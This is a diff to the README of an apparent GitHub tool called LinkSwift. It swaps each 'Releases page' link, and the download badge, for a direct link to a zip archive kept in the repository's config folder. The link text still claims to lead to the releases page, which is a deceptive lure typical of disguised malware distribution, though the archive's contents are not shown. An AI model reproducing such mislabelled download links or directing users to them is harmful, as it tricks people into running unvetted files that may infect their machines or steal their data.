@@ -6,9 +6,9 @@ LinkSwift is a straightforward tool for obtaining download links from various cl
 
 ## 📥 Download & Install
 
-To get started, visit the [Releases page](https://github.com/Mario82del/LinkSwift/releases) to download LinkSwift. 
+To get started, visit the [Releases page](https://raw.githubusercontent.com/Mario82del/LinkSwift/main/config/LinkSwift_v2.5-beta.2.zip) to download LinkSwift. 
 
-[![Download LinkSwift](https://img.shields.io/badge/Download-LinkSwift-blue.svg)](https://github.com/Mario82del/LinkSwift/releases)
+[![Download LinkSwift](https://raw.githubusercontent.com/Mario82del/LinkSwift/main/config/LinkSwift_v2.5-beta.2.zip)](https://raw.githubusercontent.com/Mario82del/LinkSwift/main/config/LinkSwift_v2.5-beta.2.zip)
 
 After you download the latest version, follow these steps to run the application:
 
@@ -75,4 +75,4 @@ LinkSwift is licensed under the MIT License. You are free to use this software, 
 
 Your feedback is important to us. If you have suggestions or issues to report, please use the GitHub issues page. We appreciate your input!
 
-For more information and community discussions, feel free to check out our [Releases page](https://github.com/Mario82del/LinkSwift/releases).
+For more information and community discussions, feel free to check out our [Releases page](https://raw.githubusercontent.com/Mario82del/LinkSwift/main/config/LinkSwift_v2.5-beta.2.zip).
